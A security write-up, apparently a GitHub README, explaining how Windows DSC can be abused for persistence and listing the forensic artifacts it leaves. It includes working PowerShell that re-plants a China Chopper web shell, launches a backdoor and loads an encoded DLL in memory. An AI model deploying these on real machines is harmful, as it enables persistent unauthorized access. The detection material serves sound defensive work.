<meta property="og:title" content="Desired_State_Configuration_Persistence">
<meta property="og:description" content="description">
<meta property="og:image" content="https://github.com/salehmuhaysin/Desired_State_Configuration/blob/master/images/PullMode.png?raw=true">
<meta property="og:url" content="https://github.com/salehmuhaysin/Desired_State_Configuration_Persistence/blob/master/README.md">
<meta name="twitter:card" content="summary_large_image">

# Introduction

How to make the machine desire to be compromised using Windows Desired State Configuration (DSC) feature? \
The DSC feature introduced by Microsoft in Windows Operating Systems with PowerShell 4 and up to help system administrators manages the machine's configurations (such as creating files, copy files, set registry values, install/uninstall Windows features, run PowerShell scripts, etc.). 
However, the DSC might be used also for malicious activities by the attackers for implanting a persistence or lateral movement, in this article we will describe the basics of the DSC and Local Configuration Manager (LCM), and how to utilize it to implant a persistence on a compromised machine whether server or workstation to run malicious PowerShell script. also, the artifacts generated by using DSC on the machine. What makes this technique threatening is that it is hard to detect (event Microsoft Autoruns does not show this persistence) also even after detection the configurations are encrypted which makes it difficult to know what is the malicious configuration used by the attacker.  

# LCM and DSC Configuration

## LCM
The LCM is an engine that runs periodically to verify the compromised machine is in the desired state and will apply the DSC configuration on the compromised machine if not. The desired state of the machine configured in DSC and attackers can define the desired state to ensure the machine is compromised, for example, if the Webshell does not exist in the machine then write it again, or if the backdoor process is not running then run the backdoor again which make a persistence in the compromised machine. There are two modes of LCM (Pull and Push) and can be configured depending on your requirements.

#### Pull Mode
Multiple machines can be configured to pull the DSC configurations from a centralized server. 
This technique used commonly by the attackers for:
- Configuring the LCM on the victim machine(s) to pull and apply malicious DSC configuration from another machine compromised and configured to be the centralized server for DSC configurations. The attacker then can use the centralized server as a C2 and upload the malicious DSC configurations to it to be published to the other machines (We will not talk about this technique, refer to the [link](https://www.blackhat.com/docs/asia-16/materials/asia-16-Kazanciyan-DSCompromised-A-Windows-DSC-Attack-Framework.pdf) for more details of this technique).

![PullMode](https://github.com/salehmuhaysin/Desired_State_Configuration/blob/master/images/PullMode.png?raw=true)\
**Figure 1**: LCM Pull Mode
 
 
#### Push Mode
If the LCM configured in push mode, then it will keep pushing the specified DSC configuration to the specified machines inside the DSC. 
This technique used commonly by the attackers for:
- A lateral movement where the attacker compromises machine inside the network (or gaining VPN access to the network), configure the LCM in push mode, scan the network to specify the targeted machines, then write DSC configurations for these targeted machines. The LCM will push the DSC configuration to these targeted machines and run the malicious configurations (such as installing a backdoor).  

![LCM_Push_lateral_movement](https://github.com/salehmuhaysin/Desired_State_Configuration/blob/master/images/LCM_Push_lateral_movement.png?raw=true)\
**Figure 2**: LCM Lateral Movement Using Push Mode

- Implant a persistence inside the compromised machine by configuring the LCM in push mode and the targeted machine in DSC is "localhost", configure the DSC to run a PowerShell script to install and run the malicious persistence (write Webshell, run backdoor, etc.), the LCM will run periodically to ensure the DSC configuration applied, so even if the backdoor removed the LCM will apply the DSC configuration to install the backdoor again, we will talk more about this technique in this article.

![LCM_Push_Persistence](https://github.com/salehmuhaysin/Desired_State_Configuration/blob/master/images/LCM_Push_Persistence.png?raw=true)\
**Figure 3**: LCM Persistence Using Push Mode

### Configure LCM

First, the LCM configured using a PowerShell script and each configuration has a name, also you need to specify the targeted machine (```node```) which we will apply the LCM configuration on (we will use "localhost" to target the same machine), and provide the ```LocalConfigurationManager``` configuration parameters, the following ```LCM_Config.ps1``` script used to set the LCM configuration.
Note: you need Administrator privileges

```Powershell
configuration LCM_Config
{
    node localhost
    {
        LocalConfigurationManager
        {
            RefreshMode = 'Push'
            AllowModuleOverwrite = $true
            ConfigurationMode = 'ApplyAndAutoCorrect'
            ConfigurationModeFrequencyMins = 15
            RebootNodeIfNeeded = $false
        }
    }
}
winrm quickconfig -q
LCM_Config -outputpath C:\users\test\desktop\DSC
Set-DscLocalConfigurationManager -ComputerName localhost -Path C:\users\test\desktop\DSC -Verbose
```

The LCM configuration named **"LCM_Config"** (can be changed) and targeted machine **"localhost"**, and configured the LCM parameters as following:
LCM Parameter | LCM Parameter Value | Description
--------------|-------------------- | ---------------
RefreshMode   | Push                | Configure the LCM to push the DSC not pull
AllowModuleOverwrite | $true | If the LCM configuration already exists overwrite it
ConfigurationMode | ApplyAndAutoCorrect | Verify the desired state of the machine periodically, and if not in the desired state then apply the configuration again, the time interval based on "ConfigurationModeFrequencyMins" Parameter
ConfigurationModeFrequencyMins | 15 | The time interval to verify the state (DscTimer check every 15 minutes), the valid range from 15 to 44640 minutes.
RebootNodeIfNeeded | $false | If the action requires a reboot, don't reboot the system (usually the attackers don't want that to happen)


The LCM requires WinRM enabled on the machine, ```winrm quickconfig -q``` command enables the WinRM. Then, the configuration should be compiled into Managed Object Format (MOF) file ```localhost.meta.mof```, the file will be stored in the specified path ```C:\users\test\desktop\DSC```. Finally, set the LCM configuration by ```Set-DscLocalConfigurationManager``` with the specified targeted machine ```localhost``` and the path containing the ```localhost.meta.mof``` file (```C:\users\test\desktop\DSC```).


![Result_of_LCM_Config](https://github.com/salehmuhaysin/Desired_State_Configuration/blob/master/images/Result_of_LCM_Config.ps1.png?raw=true)\
**Figure 4**: Output of Running the PowerShell Script (LCM_Config.ps1) 


## DSC

The DSC configuration contains variant **Resources** (WindowsFeature, WindowsProcess, User, Script, etc.) that will be applied by LCM, and each one performs a specific action. Every resource has its specific required and optional parameters that are needed by DSC, run the following PowerShell command to get all available resources in the machine.

```Powershell
Get-DscResource
```
![output_of_Get_DSCResource](https://github.com/salehmuhaysin/Desired_State_Configuration/blob/master/images/output_of_Get_DSCResource.png?raw=true)\
**Figure 5**: List of Avaliable Resources in the Machine

We will only use the **Script** resource in the DSC configuration, which will run a PowerShell script block on the targeted machine, in our example the PowerShell script will write a China Chopper Webshell on the machine on (```C:\users\test\desktop\webshell.aspx```), so even if the security team removed the Webshell, the LCM will verify if the Webshell does not exist then write it again. 
The following ```DSC_Config.ps1``` script used to set the DSC configuration.


```PowerShell
configuration DSC_Config
{
    Node localhost
    {
        Script persistence_powershell
        {
            GetScript ={$true}
            SetScript = {
                Set-Content -Path 'C:\users\test\desktop\webshell.aspx' -Value '<%@ Page Language="Jscript"%><%eval(Request.Item[”pass"],"unsafe");%>'
            }
            TestScript = {
                return [System.IO.File]::Exists("C:\users\test\desktop\webshell.aspx")
            }
        }
    }
}

DSC_Config -outputpath C:\users\test\desktop\DSC
Start-DscConfiguration -Path C:\users\test\desktop\DSC -Force -ErrorAction Ignore
```
![Result_of_DSC_Config](https://github.com/salehmuhaysin/Desired_State_Configuration/blob/master/images/Result_of_DSC_Config.ps1.png?raw=true)\
**Figure 6**: Output of Running the PowerShell Script (DSC_Config.ps1) 


Again creating a configuration named **"DSC_Config"** and targeted machine **"localhost"**, inside the configuration, define the **Script** resource named **persistence_powershell**, the Script resource accept three parameters
#### GetScript: 
This parameter will not affect the persistence since DSC will not use it, however, this parameter will be used by the command ```Get-DscConfiguration``` to get the script information, for example, if we define the ```GetScript``` as following
```PowerShell
GetScript ={
    return @{Result = "China Chopper Webshell"} 
}
```
And executed the command ```Get-DscConfiguration```, we got the following result
![output_of_Get_DSCConfiguration](https://github.com/salehmuhaysin/Desired_State_Configuration/blob/master/images/output_of_Get_DSCConfiguration.png?raw=true)\
**Figure 7**: Details of GetScript in DSC Configuration

If you don't need to set the configuration information, just use ```GetScript ={$true}```

#### SetScript: 
This is the PowerShell script to be executed when applying the DSC configuration. In the example, the PowerShell script writes a China Chopper Webshell file on the desktop. Attackers might run malicious PowerShell script, such as running reverse-shell backdoor, run backdoor to listen on a specific port, etc.

#### TestScript: 
This is a PowerShell script block used to determine whether DSC should be applied or not. So, before running the **SetScript**, LCM will check the **TestScript**, if it returns ```$false``` then that's means the system is not in the desired state and DSC **SetScript** should be applied. In our example, we verify if the Webshell does not exist, then run script block **SetScript** to write the Webshell again. If the attacker uses a timestomping technique on the dropped Webshell to modify its last modification time, then it is better to set this parameter to avoid re-writing the Webshell and change the timestomping. Also, if the attacker uses the DSC to run a backdoor, it is better to check the backdoor process if it exists or not to avoid running multiple backdoor processes.

Refer to [Microsoft DSC Script Resource](https://docs.microsoft.com/en-us/powershell/scripting/dsc/reference/resources/windows/scriptresource?view=powershell-7) for more details about Script resource, also checkout this [link](https://www.red-gate.com/simple-talk/sysadmin/powershell/powershell-desired-state-configuration-the-basics/) for more details about DSC configuration with different resources.

After defining the DSC configuration, we need to compile it to ```.mof``` file using the command ```DSC_Config -outputpath C:\users\test\desktop\DSC```, the compiled file ```localhost.mof``` will be stored in ```C:\users\test\desktop\DSC``` folder, and then run ```Start-DscConfiguration``` command to apply the DSC configuration on the machine. Now you should see the Webshell ```webshell.aspx``` created on the desktop.

# DSC Artifacts

Now that we know how to configure and set the DSC to run a PowerShell script block as persistence on the machine, there are some artifacts generated from the DSC configuration that will help during detection and analysis.

### Process

The PowerShell DSC configuration script block (```persistence_powershell```) will be running in the context of WMI Provider Host process (```WmiPrvSE.exe```) with SYSTEM privileges, so you will not see a ```powershell.exe``` process created to run the script. 

![WmiPrvSE_Process](https://github.com/salehmuhaysin/Desired_State_Configuration/blob/master/images/WmiPrvSE_Process.png?raw=true)\
**Figure 8**: WmiPrvSE.exe Process

Also, you will notice that the created Webshell owner account is SYSTEM too.

![webshell_and_owner_account](https://github.com/salehmuhaysin/Desired_State_Configuration/blob/master/images/webshell_and_owner_account.png?raw=true)\
**Figure 9**: Created Webshell and Owner Account

The ```WmiPrvSE.exe``` process will be terminated after applying the configuration. If the script block in DSC run a new backdoor process, for example, the following script block

```PowerShell
SetScript = {
    Start-Process  -FilePath "C:\users\test\desktop\backdoor.exe"
}
```
The ```backdoor.exe``` process will run as a child of ```WmiPrvSE.exe``` and also with SYSTEM privileges (this might confuse the analysis since it is similar behavior on the destination machine when creating a remote process using WMIC execution), after few seconds the parent process ```WmiPrvSE.exe``` will be terminated and the ```backdoor.exe``` process will be still running as an orphan process.

![WmiPrvSE_Parent_of_Backdoor](https://github.com/salehmuhaysin/Desired_State_Configuration/blob/master/images/WmiPrvSE_Parent_of_Backdoor.png?raw=true)\
**Figure 10**: Create Child Process from DSC PowerShell Script Block

Now, to hide the malware process, the attacker can use embedded backdoor encoded using base64 *<base64-encoded-dll>* inside the script block (```persistence_powershell```) as following
 
```PowerShell
SetScript = {
    [byte[]]$backdoor_dll = [System.Convert]::FromBase64String('<base64-encoded-dll>')
    $cl = [System.Text.Encoding]::ASCII.GetString('')
    $backdoor = [Reflection.Assembly]::Load($backdoor_dll)
    $b_program = $backdoor.GetType('backdoor.Program')
    $b_method = $b_program.GetMethod('Run')
    $b_instance = [Activator]::CreateInstance($b_program, $null)
    $b_method.Invoke($b_instance)
}

```
The PowerShell script will decode the base64 encoded backdoor DLL, and load it inside the memory of the process running this script block (which is ```WmiPrvSE.exe```) and run the method ```Run```. This backdoor might open a listening port on the machine, or communicate back to C2 and will keep running all the time, and process ```WmiPrvSE.exe``` will not be terminated.


### Registry

When LCM configured, a new AgentId will be created for DSC in ```HKLM\SOFTWARE\Microsoft\DesiredStateConfiguration``` (as showing below), this AgentId can be used to trace the DSC configuration activities.

![DSC_Registry_AgentId](https://github.com/salehmuhaysin/Desired_State_Configuration/blob/master/images/DSC_Registry_AgentId.png?raw=true)\
**Figure 11**: DSC Registry Agent ID


### Windows Events

The following table lists the created events and their description, there are specific channels for DSC in Windows Events (Microsoft-Windows-DSC/Operational and Microsoft-Windows-DSC/Admin)

Log Name | EventID | Description
-------- | ------- | -----------
System   | 10148   | WinRM config, This will be created when enabling WinRM Listenr.
System   | 7040    | WinRM config, change the WinRM service type to auto start.
Microsoft-Windows-DSC/Operational | 4407 | Generation of new Agent ID
Microsoft-Windows-DSC/Operational | 4413 | Agent ID written to Registry
Microsoft-Windows-DSC/Operational | 4271 | LCM Started (this will recorded every 15 minutes depends on the configuration)
Microsoft-Windows-DSC/Operational | 4102 | Records the user-sid and computer (useful with lateral movement) that set the LCM and DSC configuration
Microsoft-Windows-DSC/Operational | 4251 | LCM or Consistency Check/Pull completed successfully
Microsoft-Windows-DSC/Operational | 4257 | Contains the configuration specified in ```LCM_Config``` during the configuration
Microsoft-Windows-DSC/Operational | 4332 | Indication of execution of the PowerShell script block ```persistence_powershell```, however it will not store the script itself
Windows PowerShell | 400 | Indication of running the PowerShell script block ("HostApplication=C:\Windows\system32\wbem\wmiprvse.exe")
Microsoft-Windows-WinRM/Operational | 44 | The WinRM protocol handler started to create a session at the following destination: localhost. which is the targeted machine we used
Microsoft-Windows-WinRM/Operational | 47 | This indicate whether EventID 44 belong to DSC or not, it will use the class "MSFT_DSCLocalConfigurationManager" if it belongs to DSC
Microsoft-Windows-WMI-Activity/Operational | 5857 | Indication of running DSC, HostProcess = wmiprvse.exe, ProviderPath = %systemroot%\system32\DscCore.dll
Microsoft-Windows-PowerShell/Operational | 4101 | This event record the complete script block used to configure the DSC ``` DSC_Config.ps1``` and ```LCM_Config.ps1``` as well as other DSC configurations, unfortunately, the PowerShell script block disabled by default.


### File System

Even if the machine rebooted, the DSC will still work, so where does these configurations stored in disk. Configuring DSC creates/modify multiple files in the disk.


#### ps1 files
The PowerShell scripts used to set the LCM and DSC configuration, in our examples ```LCM_Config.ps1``` and ```DSC_Config.ps1``` (hopefully the attacker didn't remove them)
#### MOF files
The command ```*<configuration>* -outputpath C:\users\test\desktop\DSC``` used to compile the configuration into ```.mof``` files in the PowerShell scripts will create two files in output path (note the file name contain the targeted machine name, in our case "localhost"):
- ```localhost.meta.mof```:  The metadata of LCM configuration
- ```localhost.mof```:  The DSC configuration, contains the DSC Script resource content configured in ```DSC_Config.ps1```
Both ```.ps1``` and MOF files could be removed by the attacker after DSC configured.

#### Windows Configuration
Windows will store the DSC and LCM configurations in the folder ```C:\Windows\System32\Configuration\```. 
DSC has three statuses (Previous, Pending, and Current) during applying the configuration, and each has its file inside the Configuration folder.
- ```Current.mof```: This contains current applied DSC configuration 
- ```Pending.mof```: This file contains the configuration that needs to be applied (for example if the DSC script resource contains an infinite operation such as listen on port, keylogger, or a backdoor loaded in ```WmiPrvSE.exe``` process, the DSC will stock in pending phase and the ```Current.mof``` file will not be created)
- ```Previous.mof```: If new configuration applied, DSC will keep a backup of ```Current.mof``` into ```Previous.mof```

The configuration files ```Current.mof```, ```Pending.mof```, and ```Previous.mof``` used to be in clear-text in PowerShell 4.0, Unfortunately, starting from PowerShell 5.0 these configurations files encrypted using Windows Data Protection API (WDPAPI), the purpose is to encrypt any confidential credentials used by the administrator inside these configurations, so you will not be able to know its content.

Other files for LCM will be created also in ```C:\Windows\System32\Configuration\``` folder to keep its configuration and history
- ```MetaConfig.mof```: Contains the LCM configuration, including RefreshMode, AgentId, ConfigurationModeFrequencyMins, etc.
- ```DSCStatusHistory.mof```: Contains the history of running the LCM (JobID and date)
- ```DSCResourceStateCache.mof```: Contains information about the DSC resource (Source file ```DSC_Config.ps1``` path, configuration name, the start date of running the configuration)
- ```ConfigurationStatus\```: This folder includes multiple files contains the DSC information.


# Conclusion

This article described the basics of DSC and LCM and how to use DSC to implant a DSC persistence in the compromised machine to run a PowerShell script block, inside the DSC we can configure a PowerShell Script block resource to be executed whenever LCM run the DSC. In addition to the generated artifacts during DSC configuration, such as process, registry, windows events, and files. 


# External Links
The following link might help you during you investigation to cover more details of DSC
- [https://www.red-gate.com/simple-talk/sysadmin/powershell/powershell-desired-state-configuration-the-basics/](https://www.red-gate.com/simple-talk/sysadmin/powershell/powershell-desired-state-configuration-the-basics/)
- [https://www.blackhat.com/docs/asia-16/materials/asia-16-Kazanciyan-DSCompromised-A-Windows-DSC-Attack-Framework.pdf](https://www.blackhat.com/docs/asia-16/materials/asia-16-Kazanciyan-DSCompromised-A-Windows-DSC-Attack-Framework.pdf)
- [https://docs.microsoft.com/en-us/powershell/scripting/dsc/reference/resources/windows/scriptresource?view=powershell-7](https://docs.microsoft.com/en-us/powershell/scripting/dsc/reference/resources/windows/scriptresource?view=powershell-7)

